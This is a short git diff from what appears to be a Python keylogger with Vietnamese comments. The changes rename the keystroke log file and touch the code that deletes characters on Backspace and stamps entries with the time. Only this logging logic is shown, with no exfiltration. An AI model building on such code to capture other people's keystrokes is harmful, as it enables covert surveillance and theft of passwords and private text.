@@ -55,7 +55,7 @@ def anonymous(key):
     # * Xóa một ký tự trong file khi gõ Backspace
     if key == "Key.backspace":
         key = ""
-        with open("log.txt", 'rb+') as file:
+        with open("keyLog.txt", 'rb+') as file:
             file.seek(-1, os.SEEK_END)
             file.truncate()
 
@@ -133,7 +133,7 @@ def anonymous(key):
     today = str(today)
     if current_time != time.strftime("%H:%M", t):
         current_time = time.strftime("%H:%M", t)
-        with open("log.txt", "a") as file:
+        with open("keyLog.txt", "a") as file:
             file.write(" \n\n [" + today + " " + current_time + "]: \n ") 
 
     # * Chỉnh sửa phần này thành file muốn in ra
